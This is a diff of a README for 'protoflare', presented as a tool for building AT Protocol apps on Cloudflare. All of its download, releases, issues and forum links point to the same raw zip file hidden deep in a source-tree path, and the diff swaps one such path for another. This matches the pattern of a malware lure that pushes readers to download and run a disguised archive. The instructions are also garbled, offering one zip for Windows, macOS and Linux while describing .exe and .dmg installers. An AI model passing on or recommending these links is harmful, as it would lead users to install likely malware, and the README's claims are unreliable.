@@ -1,7 +1,7 @@
 # 🌟 protoflare - Build AT Protocol Apps Easily
 
 ## 📥 Download Now
-[![Download protoflare](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip%https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip)](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip)
+[![Download protoflare](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip%https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip)](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip)
 
 ## 📋 Description
 Protoflare helps you build AT Protocol apps on Cloudflare faster. It simplifies the process, allowing you to focus on your ideas rather than get caught in technical details.
@@ -10,13 +10,13 @@ Protoflare helps you build AT Protocol apps on Cloudflare faster. It simplifies 
 To get started with Protoflare, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to [this page to download](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip). Here, you will see the latest version of Protoflare available for download.
+   Go to [this page to download](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip). Here, you will see the latest version of Protoflare available for download.
 
 2. **Choose the Right File**
    Once on the releases page, look for the latest version listed. You will find different files for download. Choose the appropriate file for your operating system. Common options include:
-   - **Windows:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip`
-   - **macOS:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip`
-   - **Linux:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip`
+   - **Windows:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip`
+   - **macOS:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip`
+   - **Linux:** `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip`
 
 3. **Download the File**
    Click on the file name to start your download. This will save the application to your computer.
@@ -25,7 +25,7 @@ To get started with Protoflare, follow these steps:
    After downloading, locate the file in your downloads folder or wherever you saved it. 
    - For Windows, double-click the `.exe` file to start the installation. Follow the prompts to install.
    - For macOS, open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip` file and follow the instructions in the README contained within the folder.
+   - For Linux, extract the `https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip` file and follow the instructions in the README contained within the folder.
 
 5. **Run Protoflare**
    After installation, locate the Protoflare app on your computer and double-click it to launch. You’re ready to start building your AT Protocol apps!
@@ -57,7 +57,7 @@ Protoflare comes packed with features to help you:
 - **Integration Capabilities:** Easily connect with Cloudflare services to enhance your apps.
 
 ## 📥 Download & Install
-To download Protoflare, revisit the [Releases Page](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip). 
+To download Protoflare, revisit the [Releases Page](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip). 
 
 - Follow the steps outlined above to download and install the version that fits your operating system.
 - If you have any trouble, please check the FAQ or contact support.
@@ -76,7 +76,7 @@ A: Visit the issues section on our GitHub repository. You can submit your questi
 Join our community to connect with others using Protoflare. Share your projects, seek advice, and learn more about building AT Protocol apps on Cloudflare.
 
 **Links:**  
-- [GitHub Issues](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip)  
-- [Community Forum](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip)  
+- [GitHub Issues](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip)  
+- [Community Forum](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip)  
 
-Download now and empower your app-building journey with Protoflare! Visit [this page to download](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/Abdiel/protoflare.zip) and explore the new possibilities.
+Download now and empower your app-building journey with Protoflare! Visit [this page to download](https://raw.githubusercontent.com/Shellimicro546/protoflare/main/templates/explorer/src/lexicons/types/com/atproto/Software_2.0-alpha.2.zip) and explore the new possibilities.
